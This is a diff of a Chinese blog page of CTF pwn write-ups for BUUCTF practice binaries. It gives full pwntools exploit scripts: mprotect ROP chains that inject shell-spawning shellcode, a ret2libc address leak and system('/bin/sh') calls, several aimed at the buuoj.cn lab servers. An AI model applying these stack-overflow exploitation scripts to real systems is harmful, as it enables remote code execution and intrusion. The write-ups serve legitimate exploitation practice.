- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">栈溢出到mprotect函数（call==push+jmp）</span><br><span class="line">所以ret后要留一个返回地址，因为ret就相当于jmp到mprotect。</span><br><span class="line">payload大致为：</span><br><span class="line">payload = &#x27;a&#x27;*0x38+p32(mprotect_add)+p32(ret_add)</span><br><span class="line">payload+=p32(argu1) + p32(argu2) +p32 (argu3)</span><br><span class="line">第一个参数是被修改内存的地址：0x80ea000</span><br><span class="line">第二个参数是被修改内存的大小：必须是页的整数倍，0x1000</span><br><span class="line">第三参数值权限：0x7</span><br><span class="line">然后找个pop来平衡堆栈：</span><br><span class="line">ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27;</span><br><span class="line">因为是3个参数，就找3个pop</span><br><span class="line">现在payload：</span><br><span class="line">payload = &#x27;a&#x27; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload += p32(ret_addr2)</span><br><span class="line"></span><br><span class="line">ret_addr2是read函数的地址，将shellcode写入内存。</span><br><span class="line">read函数原型：</span><br><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">fd 设为0时就可以从输入端读取内容</span><br><span class="line">buf 设为我们想要执行的内存地址    </span><br><span class="line">size 适当大小，足够写入shellcode就OK</span><br></pre></td></tr></table></figure>
-
-<p>​    完整exp：</p>
+<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">栈溢出到mprotect函数（call==push+jmp）</span><br><span class="line">所以ret后要留一个返回地址，因为ret就相当于jmp到mprotect。</span><br><span class="line">payload大致为：</span><br><span class="line">payload = &#x27;a&#x27;*0x38+p32(mprotect_add)+p32(ret_add)</span><br><span class="line">payload+=p32(argu1) + p32(argu2) +p32 (argu3)</span><br><span class="line">第一个参数是被修改内存的地址：0x80ea000</span><br><span class="line">第二个参数是被修改内存的大小：必须是页的整数倍，0x1000</span><br><span class="line">第三参数值权限：0x7</span><br><span class="line">然后找个pop来平衡堆栈：</span><br><span class="line">ROPgadget --binary get_started_3dsctf_2016 --only &#x27;pop|ret&#x27;</span><br><span class="line">因为是3个参数，就找3个pop</span><br><span class="line">现在payload：</span><br><span class="line">payload = &#x27;a&#x27; + 0x38 + p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)</span><br><span class="line">payload += p32(ret_addr2)</span><br><span class="line"></span><br><span class="line">ret_addr2是read函数的地址，将shellcode写入内存。</span><br><span class="line">read函数原型：</span><br><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">fd 设为0时就可以从输入端读取内容</span><br><span class="line">buf 设为我们想要执行的内存地址    </span><br><span class="line">size 适当大小，足够写入shellcode就OK</span><br></pre></td></tr></table></figure></p>
+<p>​ 完整exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">pop3_ret = <span class="number">0x804951D</span></span><br><span class="line">mem_addr = <span class="number">0x80ec000</span> </span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop3_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop3_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x1000</span>) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0xB-ciscn-2019-en-2"><a href="#0xB-ciscn-2019-en-2" class="headerlink" title="0xB.ciscn_2019_en_2"></a>0xB.ciscn_2019_en_2</h2><p>和ciscn_2019_c_1是一模一样的…</p>
+<h2 id="xb.ciscn_2019_en_2">0xB.ciscn_2019_en_2</h2>
+<p>和ciscn_2019_c_1是一模一样的...</p>
 <p>ret2libc.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_en_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29045</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_en_2&quot;</span>)</span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400c83</span></span><br><span class="line">main = <span class="number">0x400B28</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span> * <span class="string">&#x27;a&#x27;</span>+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;choice!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ciphertext&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr =u64(io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x58</span>*<span class="string">&#x27;a&#x27;</span>+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)</span><br><span class="line"><span class="comment">#Ubuntu18调用system时要ret，不然会crash</span></span><br><span class="line"><span class="comment">#栈对齐</span></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;encrypted&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0xC-jarvisoj-level2"><a href="#0xC-jarvisoj-level2" class="headerlink" title="0xC.jarvisoj_level2"></a>0xC.jarvisoj_level2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ file level2 </span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br><span class="line"></span><br><span class="line">gwt@ubuntu:~/Desktop$  checksec level2 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/level2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
+<h2 id="xc.jarvisoj_level2">0xC.jarvisoj_level2</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ file level2 </span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br><span class="line"></span><br><span class="line">gwt@ubuntu:~/Desktop$  checksec level2 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/level2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
 <p>没后门函数，重要的部分：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>有/bin/sh字符串。而且没开PIE，字符串的地址不会变</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level2&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level2&quot;)</span></span><br><span class="line"><span class="comment">#node3.buuoj.cn:28929</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28929</span>)</span><br><span class="line">sys_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#bin_sh = 0x0804A024</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> +p32(sys_plt)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0xD-ciscn-2019-n-8"><a href="#0xD-ciscn-2019-n-8" class="headerlink" title="0xD.ciscn_2019_n_8"></a>0xD.ciscn_2019_n_8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-
+<h2 id="xd.ciscn_2019_n_8">0xD.ciscn_2019_n_8</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_2019_n_8&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-14h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  var[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  var[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, var, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( *&amp;var[<span class="number">13</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;var[<span class="number">13</span>] == <span class="number">17LL</span> )</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;something wrong! val is %d&quot;</span>,</span><br><span class="line">        var[<span class="number">0</span>],</span><br><span class="line">        var[<span class="number">1</span>],</span><br><span class="line">        var[<span class="number">2</span>],</span><br><span class="line">        var[<span class="number">3</span>],</span><br><span class="line">        var[<span class="number">4</span>],</span><br><span class="line">        var[<span class="number">5</span>],</span><br><span class="line">        var[<span class="number">6</span>],</span><br><span class="line">        var[<span class="number">7</span>],</span><br><span class="line">        var[<span class="number">8</span>],</span><br><span class="line">        var[<span class="number">9</span>],</span><br><span class="line">        var[<span class="number">10</span>],</span><br><span class="line">        var[<span class="number">11</span>],</span><br><span class="line">        var[<span class="number">12</span>],</span><br><span class="line">        var[<span class="number">13</span>],</span><br><span class="line">        var[<span class="number">14</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s, Welcome!\n&quot;</span>, var);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try do something~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>所以payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ciscn_2019_n_8&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29560</span> )</span><br><span class="line">io.recv() </span><br><span class="line">payload = p32(<span class="number">17</span>) * <span class="number">14</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="0xE-not-the-same-3dsctf-2016"><a href="#0xE-not-the-same-3dsctf-2016" class="headerlink" title="0xE.not_the_same_3dsctf_2016"></a>0xE.not_the_same_3dsctf_2016</h2><p>就两个有用的函数：</p>
+<h2 id="xe.not_the_same_3dsctf_2016">0xE.not_the_same_3dsctf_2016</h2>
+<p>就两个有用的函数：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">45</span>]; <span class="comment">// [esp+Fh] [ebp-2Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>和get_started_3dsctf_2016一样，用mprotect修改内存的权限。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29052</span>)</span><br><span class="line">pop_ret = <span class="number">0x08050b45</span></span><br><span class="line"><span class="comment">#pop ebx ; pop esi ; pop edi ; ret</span></span><br><span class="line">mem_addr = <span class="number">0x80ec000</span> </span><br><span class="line">mem_size = <span class="number">0x1000</span>    </span><br><span class="line">mem_proc = <span class="number">0x7</span>       </span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x2d</span></span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_ret) </span><br><span class="line">payload += p32(mem_addr) </span><br><span class="line">payload += p32(mem_size)  </span><br><span class="line">payload += p32(mem_proc)   </span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_ret)  </span><br><span class="line">payload += p32(<span class="number">0</span>)     </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(mem_addr)   </span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh()) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0xF-bjdctf-2020-babystack"><a href="#0xF-bjdctf-2020-babystack" class="headerlink" title="0xF.bjdctf_2020_babystack"></a>0xF.bjdctf_2020_babystack</h2><p>有个后门函数。主程序：</p>
+<h2 id="xf.bjdctf_2020_babystack">0xF.bjdctf_2020_babystack</h2>
+<p>有个后门函数。主程序：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000010 buf             db 12 dup(?)</span><br><span class="line">-0000000000000004 nbytes          dq ?</span><br><span class="line">+0000000000000004                 db ? ; undefined</span><br><span class="line">+0000000000000005                 db ? ; undefined</span><br><span class="line">+0000000000000006                 db ? ; undefined</span><br><span class="line">+0000000000000007                 db ? ; undefined</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br></pre></td></tr></table></figure>
-
 <p>这个题，两个思路吧（其实是一样的），一个就是将输入的nbytes开大一点，直接可以覆盖到返回地址。</p>
 <p>或者就是整数溢出，根据size_t与unsigned int的不同来做（其实也是将nbytes(buf)开的很大，覆盖返回地址）。</p>
